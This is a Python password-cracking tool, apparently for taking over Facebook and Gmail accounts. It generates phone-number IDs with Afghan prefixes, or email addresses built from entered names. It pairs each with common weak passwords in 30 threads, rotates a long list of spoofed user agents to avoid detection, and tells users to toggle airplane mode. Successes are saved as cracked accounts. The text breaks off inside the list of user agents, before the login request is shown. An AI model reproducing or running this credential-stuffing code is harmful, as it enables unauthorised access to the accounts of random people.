'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/308.0.0.10.108',
'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104',
'Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;',
'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; en-US; Redmi K30 5G Speed Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36',

]
logo =f"""{WHITE}

YELLOW{██████╗  █████╗ ██╗   ██╗ █████╗ ███████╗
{GREEN} ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝
{BLUE}██████╔╝███████║ ╚████╔╝ ███████║███████╗
{GREEN} ██╔══██╗██╔══██║  ╚██╔╝  ██╔══██║╚════██║
YELLOW██║  ██║██║  ██║   ██║   ██║  ██║███████║
{BLUE}╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
                                         

======================================================
[{RED}•{WHITE}] AUTHOR     :{GREEN} MOHAMMAD ELYAS{WHITE}
[{RED}•{WHITE}] FACEBOOK   : {BLUE}MOHAMMAD ELYAS{WHITE}
[{RED}•{WHITE}] PORTANER   : {lg}MATIN ALMAS{WHITE}
[{RED}•{WHITE}] GITHUB     : {ORANGE}MR-ELYAS{WHITE}
[{RED}•{WHITE}] TEAM       : {RED}BLACK{WHITE}
[{RED}•{WHITE}] STATUS     : {BLACK}VIP{WHITE}
[{RED}•{WHITE}] VERSION    : 1.6{WHITE}
======================================================
[{RED}•{WHITE}] VICTORY IS ONLY FROM ALLAH {RED}✓✓{WHITE}
======================================================"""

def lines():
	print(f'{WHITE}======================================================')
os.system ('clear')


def clear():
	os.system('clear')
	print (logo)

def Main():
	clear()
	print('\033[1;37m\033[1;41m[🤲] HAPPY RAMADAN \033[1;0m\33[1;37m')
	lines()
	print(f'{WHITE}[1]{lg} FILE CLONE {WHITE}  [TEST] ')
	print(f'{WHITE}[2]{BLUE} RANDOM CLONE{WHITE} [WORK] ')
	print(f'{WHITE}[3]{ORANGE} GMAIL CLONE{WHITE}  [TEST] ')
	print(f'{WHITE}[4]{YELLOW} FACEBOOK ADMIN ')
	print(f'{WHITE}[0] {RED}EXIT FROM TOOLS ')
	lines()
	mani = input('\033[1;37m[>] CHOOSE OPTION : ')
	if mani =='2':
		RM()
	if mani =='3':
		eml()
	if mani =='4':
		os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100');Main()
	if mani =='1':
		file()
	if mani =='0':
	    print(f'[✓] THANKS FOR USE +')
	    exit()
	else:
	    print('[!] CHOSEE CORRECT OPTION × ');Main()

def RM():
	clear()
	print(f'{WHITE}[1] {BLUE}AFG CLONE ')
	print(f'{WHITE}[2] {lg}PAK CLONE ')
	print(f'{WHITE}[0] {RED}BACK ')
	lines()
	elyas = input('[>] CHOOSE OPTION : ')
	if elyas =='1':R()
	elif elyas =='2':R2()
	elif elyas =='0':Main()
	else:
		print('[!] CHOOSE CORRECT OPTION ! ')
		Main()

def R():
    user=[]
    os.system('clear')
    print(logo)
    print(f'[√] {YELLOW}BEST CODE{WHITE} : 077 , 079 , 078 , 076 , 070')
    lines()
    kode = input('[~] PUT CODE : ')
    clear()
    print(f'[+] {BLUE}EXAMPLE {A}: 2000,5000,10000...');lines()
    limit = int(input('[+] PUT LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"[+] TOTAL IDZ  : "+tl+" ")
        print(f"[+] CODE CHOOSED : "+kode)
        print(47*"-");print('	USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
        for guru in user:
            uid = kode+guru
            pwx = [guru,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','۱۰۰۲۰۰']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(47*"-")
    print('[✓] CRACKING COMPLETED ')
    print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    print('[?] IDS SAVED IN BKT-OK.txt,BKT-CP.txt')
    input("DO YOU WANT TO GO BACK MENU ")
    Main()



def eml():
    user=[]
    os.system('clear')
    print(logo)
    print(f'{YELLOW}EXAMPLE{WHITE} : kashif , ahmad , saba , iqbal ')
    lines()
    kode = input('[>] PUT FIRST NAME : ')
    clear()
    print(f'{YELLOW}EXAMPLE{WHITE} : khan , ali , baba ')
    kodex = input('[>] PUT LAST NAME :  ');clear()
    lines()
    print('[+] EXAMPLE : @gmail.com, @yahoo.com ')
    doamin = input('[?] PUT DOMAIN : ');lines()
    limit = int(input('[?] ENTER LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"[+] TOTAL IDZ  : "+tl+" ")
        print(47*"-");print('	USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(47*"-")
    print('[✓] CRACKING COMPLETED ')
    print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    print('[?] IDS SAVED IN BKT-OK.txt,BKT-CP.txt')
    input("DO YOU WANT TO GO BACK MENU ")
    Main()

agents=[]

def rcrack1(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			agents = ['Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L523T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4782.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M349Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4755.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S840H) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4283.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J425L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4552.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B975X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4251.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P472Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4861.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q844J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4682.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q722F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4880.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B779Z) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4882.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K782V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4655.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L965Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4386.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O868O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4210.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D432P) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4221.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C63T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4801.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S815O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4727.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A669J) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4868.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y536Z) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4893.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y610J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y907L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4684.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J775N) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4760.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R132G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4247.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y278P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4789.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N344N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4220.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A741P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4688.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z235C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K314J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4387.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D553Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4594.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N569N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4885.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S335R) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4319.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S102C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4624.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E473M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4362.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L431O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4416.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W337Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4598.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S680Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4370.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q341X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4444.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q123K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4339.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F702H) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4886.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C346X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W907P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4272.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S675P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4875.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S242A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4746.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D125S) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O690L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4827.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T191S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4757.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H70Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4544.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J758G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4422.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M860R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4594.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q194M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4889.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y170X) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4817.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A706W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4405.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I883A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D264R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4466.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S583I) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4853.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C449R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4637.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J908A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4667.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U921A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4760.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L525A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4418.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K497Y) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4518.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I301P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4427.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A352M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4423.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A684P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L679E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4509.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F745Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C46A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4215.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F376J) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4763.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M790H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4533.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F824J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4553.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J126J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4348.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q27V) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4315.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J770M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T317O) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4471.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W251T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4363.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z842Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4667.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E687O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4677.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y105Q) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4862.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J638X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4830.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B824Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4439.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z700L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4549.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N835S) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4860.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K984C) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4670.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P859W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4726.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E558C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4834.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O688U) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4511.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N152B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4723.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I616F) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4846.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C895F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4831.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J621R) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4830.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C579H) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4388.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R678N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4283.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A151H) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4569.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G548U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K471F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4211.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C754S) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4225.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C611Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4897.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q71F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4328.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R23X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4457.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A73A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4886.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L585T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4885.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V27D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4250.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K796V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4283.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L533C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4641.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D467A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4771.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J178P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4605.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W937L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4761.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O334E) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4701.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P437P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C565Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4555.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N507A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4305.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M153B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4401.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I886K) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4616.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J288S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4897.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y442L) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4811.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O726U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4429.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N487P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4894.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C943K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4443.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E142Z) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4883.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X478L) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4507.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B409X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4554.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q315I) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4690.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J703P) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4406.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y789R) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4287.146 